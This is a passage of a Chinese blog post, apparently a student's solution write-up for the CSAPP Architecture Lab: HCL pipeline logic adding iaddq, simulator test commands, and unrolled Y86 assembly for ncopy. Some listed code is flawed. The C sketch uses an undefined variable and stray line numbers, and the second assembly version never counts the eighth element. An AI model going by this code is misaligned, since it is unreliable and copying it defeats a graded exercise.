class="line"></span><br><span class="line">## What register should be used as the B source? 应该使用什么寄存器作为 B 源？ D_rB</span><br><span class="line">word d_srcB = [</span><br><span class="line">	D_icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : D_rB;</span><br><span class="line">	D_icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the E destination? 应该使用什么寄存器作为 E 目标？ D_rB</span><br><span class="line">word d_dstE = [</span><br><span class="line">	D_icode in &#123; IRRMOVQ, IIRMOVQ, IOPQ, IIADDQ&#125; : D_rB;</span><br><span class="line">	D_icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the M destination? 应该使用什么寄存器作为 M 目标？ Don&#x27;t need</span><br><span class="line">word d_dstM = [</span><br><span class="line">	D_icode in &#123; IMRMOVQ, IPOPQ &#125; : D_rA;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What should be the A value? A 值应该是多少？ 用来转发 default</span><br><span class="line">## Forward into decode stage for valA 进入 valA 的解码级</span><br><span class="line">word d_valA = [</span><br><span class="line">	D_icode in &#123; ICALL, IJXX &#125; : D_valP; # Use incremented PC</span><br><span class="line">	d_srcA == e_dstE : e_valE;    # Forward valE from execute</span><br><span class="line">	d_srcA == M_dstM : m_valM;    # Forward valM from memory</span><br><span class="line">	d_srcA == M_dstE : M_valE;    # Forward valE from memory</span><br><span class="line">	d_srcA == W_dstM : W_valM;    # Forward valM from write back</span><br><span class="line">	d_srcA == W_dstE : W_valE;    # Forward valE from write back</span><br><span class="line">	1 : d_rvalA;  # Use value read from register file</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">word d_valB = [ </span><br><span class="line">	d_srcB == e_dstE : e_valE;    # Forward valE from execute</span><br><span class="line">	d_srcB == M_dstM : m_valM;    # Forward valM from memory</span><br><span class="line">	d_srcB == M_dstE : M_valE;    # Forward valE from memory</span><br><span class="line">	d_srcB == W_dstM : W_valM;    # Forward valM from write back</span><br><span class="line">	d_srcB == W_dstE : W_valE;    # Forward valE from write back</span><br><span class="line">	1 : d_rvalB;  # Use value read from register file</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行阶段</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">################ Execute Stage ##################################### 执行阶段</span><br><span class="line"></span><br><span class="line">## Select input A to ALU 选择输入 A 到 ALU E_valC</span><br><span class="line">word aluA = [</span><br><span class="line">	E_icode in &#123; IRRMOVQ, IOPQ &#125; : E_valA;</span><br><span class="line">	E_icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : E_valC;</span><br><span class="line">	E_icode in &#123; ICALL, IPUSHQ &#125; : -8;</span><br><span class="line">	E_icode in &#123; IRET, IPOPQ &#125; : 8;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU 选择输入 B 到 ALU E_valB</span><br><span class="line">word aluB = [</span><br><span class="line">	E_icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">		     IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : E_valB;</span><br><span class="line">	E_icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set the ALU function 设置 ALU 函数 default</span><br><span class="line">word alufun = [</span><br><span class="line">	E_icode == IOPQ : E_ifun;</span><br><span class="line">	1 : ALUADD;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Should the condition codes be updated? 是否应该更新条件代码？ Yes</span><br><span class="line">bool set_cc = E_icode in &#123; IOPQ, IIADDQ &#125; &amp;&amp;</span><br><span class="line">	# State changes only during normal operation</span><br><span class="line">	!m_stat in &#123; SADR, SINS, SHLT &#125; &amp;&amp; !W_stat in &#123; SADR, SINS, SHLT &#125;;</span><br><span class="line"></span><br><span class="line">## Generate valA in execute stage 在执行阶段生成 valA</span><br><span class="line">word e_valA = E_valA;    # Pass valA through stage</span><br><span class="line"></span><br><span class="line">## Set dstE to RNONE in event of not-taken conditional move 将 dstE 设置为 RNONE，以防未采取条件移动</span><br><span class="line">word e_dstE = [</span><br><span class="line">	E_icode == IRRMOVQ &amp;&amp; !e_Cnd : RNONE;</span><br><span class="line">	1 : E_dstE;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>访存阶段</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">################ Memory Stage ###################################### 访存阶段</span><br><span class="line"></span><br><span class="line">## Select memory address 	default</span><br><span class="line">word mem_addr = [</span><br><span class="line">	M_icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : M_valE;</span><br><span class="line">	M_icode in &#123; IPOPQ, IRET &#125; : M_valA;</span><br><span class="line">	# Other instructions don&#x27;t need address</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set read control signal 	default</span><br><span class="line">bool mem_read = M_icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;</span><br><span class="line"></span><br><span class="line">## Set write control signal</span><br><span class="line">bool mem_write = M_icode in &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;</span><br><span class="line"></span><br><span class="line">#/* $begin pipe-m_stat-hcl */</span><br><span class="line">## Update the status</span><br><span class="line">word m_stat = [</span><br><span class="line">	dmem_error : SADR;</span><br><span class="line">	1 : M_stat;</span><br><span class="line">];</span><br><span class="line">#/* $end pipe-m_stat-hcl */</span><br><span class="line"></span><br><span class="line">## Set E port register ID</span><br><span class="line">word w_dstE = W_dstE;</span><br><span class="line"></span><br><span class="line">## Set E port value</span><br><span class="line">word w_valE = W_valE;</span><br><span class="line"></span><br><span class="line">## Set M port register ID</span><br><span class="line">word w_dstM = W_dstM;</span><br><span class="line"></span><br><span class="line">## Set M port value</span><br><span class="line">word w_valM = W_valM;</span><br><span class="line"></span><br><span class="line">## Update processor status</span><br><span class="line">word Stat = [</span><br><span class="line">	W_stat == SBUB : SAOK;</span><br><span class="line">	1 : W_stat;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>更新 PC</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">################ Pipeline Register Control ######################### 更新 PC</span><br><span class="line"></span><br><span class="line"># Should I stall or inject a bubble into Pipeline Register F? 我应该停止还是将气泡注入管道寄存器 F？</span><br><span class="line"># At most one of these can be true. 最多其中一个可能是真的。</span><br><span class="line">bool F_bubble = 0;</span><br><span class="line">bool F_stall =</span><br><span class="line">	# Conditions for a load/use hazard</span><br><span class="line">	E_icode in &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp;	</span><br><span class="line">	 E_dstM in &#123; d_srcA, d_srcB &#125; ||</span><br><span class="line">	# Stalling at fetch while ret passes through pipeline</span><br><span class="line">	IRET in &#123; D_icode, E_icode, M_icode &#125;;</span><br><span class="line"></span><br><span class="line"># Should I stall or inject a bubble into Pipeline Register D?</span><br><span class="line"># At most one of these can be true.</span><br><span class="line">bool D_stall = </span><br><span class="line">	# Conditions for a load/use hazard</span><br><span class="line">	E_icode in &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp;	</span><br><span class="line">	 E_dstM in &#123; d_srcA, d_srcB &#125;;</span><br><span class="line"></span><br><span class="line">bool D_bubble =</span><br><span class="line">	# Mispredicted branch</span><br><span class="line">	(E_icode == IJXX &amp;&amp; !e_Cnd) ||</span><br><span class="line">	# Stalling at fetch while ret passes through pipeline</span><br><span class="line">	# but not condition for a load/use hazard</span><br><span class="line">	!(E_icode in &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp; E_dstM in &#123; d_srcA, d_srcB &#125;) &amp;&amp;	</span><br><span class="line">	  IRET in &#123; D_icode, E_icode, M_icode &#125;;</span><br><span class="line"></span><br><span class="line"># Should I stall or inject a bubble into Pipeline Register E?</span><br><span class="line"># At most one of these can be true.</span><br><span class="line">bool E_stall = 0;</span><br><span class="line">bool E_bubble =</span><br><span class="line">	# Mispredicted branch</span><br><span class="line">	(E_icode == IJXX &amp;&amp; !e_Cnd) ||</span><br><span class="line">	# Conditions for a load/use hazard</span><br><span class="line">	E_icode in &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp;	</span><br><span class="line">	 E_dstM in &#123; d_srcA, d_srcB&#125;;</span><br><span class="line"></span><br><span class="line"># Should I stall or inject a bubble into Pipeline Register M?</span><br><span class="line"># At most one of these can be true.</span><br><span class="line">bool M_stall = 0;</span><br><span class="line"># Start injecting bubbles as soon as exception passes through memory stage</span><br><span class="line">bool M_bubble = m_stat in &#123; SADR, SINS, SHLT &#125; || W_stat in &#123; SADR, SINS, SHLT &#125;;</span><br><span class="line"></span><br><span class="line"># Should I stall or inject a bubble into Pipeline Register W?</span><br><span class="line">bool W_stall = W_stat in &#123; SADR, SINS, SHLT &#125;;</span><br><span class="line">bool W_bubble = 0;</span><br></pre></td></tr></table></figure>
+
+<h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><ul>
+<li>在测试前，和 Part B 一样需要修改 makefile 文件，这里就不再赘述了</li>
+<li>通过命令 <strong>make VERSION-full</strong> 构建新的模拟器</li>
+<li>通过命令 **(cd ..&#x2F;y86-code; make testpsim)**，在基准测试程序上测试管道模拟器，运行结果如下：Succeeds</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240317180950633.png" class="" title="image-20240317180950633">
+
+<ul>
+<li>通过命令 **(cd ..&#x2F;ptest; make SIM&#x3D;..&#x2F;pipe&#x2F;psim TFLAGS&#x3D;-i)**，使用广泛的回归测试来测试管道模拟器，运行结果如下：Succeeds</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240317181118288.png" class="" title="image-20240317181118288">
+
+<ul>
+<li>以上测试说明在 pipe-full.hcl 中实现的 iaddq 是正确的，接下来需要修改 ncopy.ys 文件让它运行的更快</li>
+</ul>
+<h2 id="修改-ncopy-ys-文件"><a href="#修改-ncopy-ys-文件" class="headerlink" title="修改 ncopy.ys 文件"></a>修改 ncopy.ys 文件</h2><ul>
+<li>ncopy.ys 最初的汇编代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax				# count = 0;</span><br><span class="line">	andq %rdx,%rdx				# len &lt;= 0?</span><br><span class="line">	jle Done					# if so, goto Done:</span><br><span class="line"></span><br><span class="line">Loop:	mrmovq (%rdi), %r10		# val = *src</span><br><span class="line">	rmmovq %r10, (%rsi)			# *dest = val</span><br><span class="line">	andq %r10, %r10				# val &lt;= 0?</span><br><span class="line">	jle Npos					# if so, goto Npos:</span><br><span class="line">	irmovq $1, %r10</span><br><span class="line">	addq %r10, %rax				# count++</span><br><span class="line">Npos:	irmovq $1, %r10</span><br><span class="line">	subq %r10, %rdx				# len--</span><br><span class="line">	irmovq $8, %r10</span><br><span class="line">	addq %r10, %rdi				# src++</span><br><span class="line">	addq %r10, %rsi				# dst++</span><br><span class="line">	andq %rdx,%rdx				# len &gt; 0?</span><br><span class="line">	jg Loop						# if so, goto Loop:</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>.&#x2F;benchmark.pl</strong> 对他进行评分，分数为 0！！！</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240318211720189.png" class="" title="image-20240318211720189">
+
+<ul>
+<li>根据提示使用 8 * 8 展开，目的是：减少了索引计算的次数，减少了条件分支的判断次数</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ncopy - copy src to dst, returning number of positive ints</span></span><br><span class="line"><span class="comment"> * contained in src array.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="type">word_t</span> <span class="title function_">ncopy</span><span class="params">(<span class="type">word_t</span> *src, <span class="type">word_t</span> *dst, <span class="type">word_t</span> len)</span></span><br><span class="line"> &#123;</span><br><span class="line">		<span class="type">word_t</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="type">word_t</span> val1;</span><br><span class="line">    	<span class="type">word_t</span> val2;</span><br><span class="line">    	<span class="type">word_t</span> val3;</span><br><span class="line">    	<span class="type">word_t</span> val4;</span><br><span class="line">    	<span class="type">word_t</span> val5;</span><br><span class="line">    	<span class="type">word_t</span> val6;</span><br><span class="line">    	<span class="type">word_t</span> val7;</span><br><span class="line">     	<span class="type">word_t</span> val8;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			val1 = *src++;</span><br><span class="line">            val2 = *src++;</span><br><span class="line">            val3 = *src++;</span><br><span class="line">            val4 = *src++;</span><br><span class="line">            val5 = *src++;</span><br><span class="line">            val6 = *src++;</span><br><span class="line">            val7 = *src++;</span><br><span class="line">            val8 = *src++;</span><br><span class="line">            </span><br><span class="line">			*dst++ = val1;</span><br><span class="line">            *dst++ = val2;</span><br><span class="line">            *dst++ = val3;</span><br><span class="line">            *dst++ = val4;</span><br><span class="line">            *dst++ = val5;</span><br><span class="line">            *dst++ = val6;</span><br><span class="line">            *dst++ = val7;</span><br><span class="line">            *dst++ = val8;</span><br><span class="line">			</span><br><span class="line">            <span class="keyword">if</span> (val1 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val2 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val3 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val4 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val5 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val6 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val7 &gt; <span class="number">0</span>) count++;</span><br><span class="line">            <span class="keyword">if</span> (val8 &gt; <span class="number">0</span>) count++;</span><br><span class="line">			</span><br><span class="line">            len -= <span class="number">8</span>;</span><br><span class="line">		&#125;</span><br><span class="line">     </span><br><span class="line">    	 <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            val1 = *src++;</span><br><span class="line"><span class="number">12</span>			*dst++ = val;</span><br><span class="line"><span class="number">13</span>			<span class="keyword">if</span> (val1 &gt; <span class="number">0</span>)</span><br><span class="line"><span class="number">14</span>				count++;</span><br><span class="line"><span class="number">15</span>			len--;</span><br><span class="line">         &#125;</span><br><span class="line">		</span><br><span class="line">     	<span class="keyword">return</span> count;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>汇编代码如下</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax			# count = 0	</span><br><span class="line">	andq %rdx,%rdx				</span><br><span class="line">	jle Done				# if len &lt;= 0，return</span><br><span class="line">	jmp test			</span><br><span class="line">loop1:						# 进入 8*8 展开</span><br><span class="line">	mrmovq (%rdi), %r8</span><br><span class="line">	mrmovq 8(%rdi), %r9</span><br><span class="line">	mrmovq 16(%rdi), %r10</span><br><span class="line">	mrmovq 24(%rdi), %r11</span><br><span class="line">	mrmovq 32(%rdi), %r12</span><br><span class="line">	mrmovq 40(%rdi), %r13</span><br><span class="line">	mrmovq 48(%rdi), %r14</span><br><span class="line">	mrmovq 56(%rdi), %rbx</span><br><span class="line">	</span><br><span class="line">	rmmovq %r8, (%rsi)</span><br><span class="line">	rmmovq %r9, 8(%rsi)</span><br><span class="line">	rmmovq %r10, 16(%rsi)</span><br><span class="line">	rmmovq %r11, 24(%rsi)</span><br><span class="line">	rmmovq %r12, 32(%rsi)</span><br><span class="line">	rmmovq %r13, 40(%rsi)</span><br><span class="line">	rmmovq %r14, 48(%rsi)</span><br><span class="line">	rmmovq %rbx, 56(%rsi)</span><br><span class="line">	</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle loop2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop2:</span><br><span class="line">	andq %r9, %r9</span><br><span class="line">	jle loop3</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop3:</span><br><span class="line">	andq %r10, %r10</span><br><span class="line">	jle loop4</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop4:</span><br><span class="line">	andq %r11, %r11</span><br><span class="line">	jle loop5</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop5:</span><br><span class="line">	andq %r12, %r12</span><br><span class="line">	jle loop6</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop6:</span><br><span class="line">	andq %r13, %r13</span><br><span class="line">	jle loop7</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop7:</span><br><span class="line">	andq %r14, %r14</span><br><span class="line">	jle loop8</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop8:</span><br><span class="line">	andq %rbx, %rbx</span><br><span class="line">	jle else</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">else:</span><br><span class="line">	iaddq $64, %rdi</span><br><span class="line">	iaddq $64, %rsi</span><br><span class="line">test:</span><br><span class="line">	iaddq $-8, %rdx	</span><br><span class="line">	jg loop1			# if len - 8 &gt; 0，进入 8*8 展开</span><br><span class="line">	iaddq $8, %rdx		</span><br><span class="line">loop:					</span><br><span class="line">	mrmovq (%rdi), %r8</span><br><span class="line">	rmmovq %r8, (%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle else2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">else2:</span><br><span class="line">	iaddq $-1, %rdx</span><br><span class="line">	iaddq $8, %rdi</span><br><span class="line">	iaddq $8, %rsi</span><br><span class="line">	andq %rdx, %rdx</span><br><span class="line">	jg loop</span><br><span class="line">Done:</span><br><span class="line">	ret		</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>.&#x2F;correctness.pl</strong> 测试程序正确性，**.&#x2F;benchmark.pl** 进行打分</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240318223406738.png" class="" title="image-20240318223406738">
+
+<ul>
+<li>然而，分数还是很低 ……</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240319150433776.png" class="" title="image-20240319150433776">
+
+<ul>
+<li>改变指令执行序列再试一下，这里还通过同时 <code>mrmovq</code> 两次避免和 <code>rmmovq</code>  产生加载&#x2F;使用冒险，减少 bubble</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax			# count = 0	</span><br><span class="line">	andq %rdx,%rdx				</span><br><span class="line">	jle Done				# if len &lt;= 0，return</span><br><span class="line">	jmp test			</span><br><span class="line">loop1:						# 进入 8*8 展开</span><br><span class="line">	mrmovq (%rdi), %r8</span><br><span class="line">	mrmovq 8(%rdi), %r9</span><br><span class="line">	rmmovq %r8, (%rsi)</span><br><span class="line">	rmmovq %r9, 8(%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle loop2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop2:</span><br><span class="line">	andq %r9, %r9</span><br><span class="line">	jle loop3</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop3:	</span><br><span class="line">	mrmovq 16(%rdi), %r8</span><br><span class="line">	mrmovq 24(%rdi), %r9</span><br><span class="line">	rmmovq %r8, 16(%rsi)</span><br><span class="line">	rmmovq %r9, 24(%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle loop4</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop4:</span><br><span class="line">	andq %r9, %r9</span><br><span class="line">	jle loop5</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop5:</span><br><span class="line">	mrmovq 32(%rdi), %r8</span><br><span class="line">	mrmovq 40(%rdi), %r9</span><br><span class="line">	rmmovq %r8, 32(%rsi)</span><br><span class="line">	rmmovq %r9, 40(%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle loop6</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">loop6:</span><br><span class="line">	andq %r9, %r9</span><br><span class="line">	jle loop7</span><br><span class="line">	iaddq $1, %rax	</span><br><span class="line">loop7:</span><br><span class="line">	mrmovq 48(%rdi), %r8</span><br><span class="line">	mrmovq 56(%rdi), %r9</span><br><span class="line">	rmmovq %r8, 48(%rsi)</span><br><span class="line">	rmmovq %r9, 56(%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle else</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">else:	</span><br><span class="line">	iaddq $64, %rdi</span><br><span class="line">	iaddq $64, %rsi</span><br><span class="line">test:</span><br><span class="line">	iaddq $-8, %rdx	</span><br><span class="line">	jg loop1			# if len - 8 &gt; 0，进入 8*8 展开</span><br><span class="line">	iaddq $8, %rdx		</span><br><span class="line">loop:					</span><br><span class="line">	mrmovq (%rdi), %r8</span><br><span class="line">	rmmovq %r8, (%rsi)</span><br><span class="line">	andq %r8, %r8</span><br><span class="line">	jle else2</span><br><span class="line">	iaddq $1, %rax</span><br><span class="line">else2:</span><br><span class="line">	iaddq $-1, %rdx</span><br><span class="line">	iaddq $8, %rdi</span><br><span class="line">	iaddq $8, %rsi</span><br><span class="line">	andq %rdx, %rdx</span><br><span class="line">	